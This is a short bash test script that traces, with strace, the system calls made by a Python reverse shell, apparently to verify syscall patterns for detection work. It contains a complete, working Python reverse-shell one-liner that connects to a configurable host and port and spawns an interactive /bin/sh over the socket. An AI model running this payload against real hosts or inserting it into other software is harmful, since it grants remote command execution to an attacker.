#!/bin/bash
# Test: Trace syscalls from Python reverse shell
# Purpose: Verify Python makes socket(), connect(), dup2(), execve() syscalls
# Expected: Should see all 4 syscall types

TARGET_IP="${1:-127.0.0.1}"
TARGET_PORT="${2:-4444}"

echo "🔬 Tracing Python reverse shell syscalls..."
echo "   Target: $TARGET_IP:$TARGET_PORT"
echo ""

strace -e trace=socket,connect,dup2,execve python3 -c \
  "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$TARGET_IP',$TARGET_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])" \
  2>&1 | grep -E "socket|connect|dup2|execve"
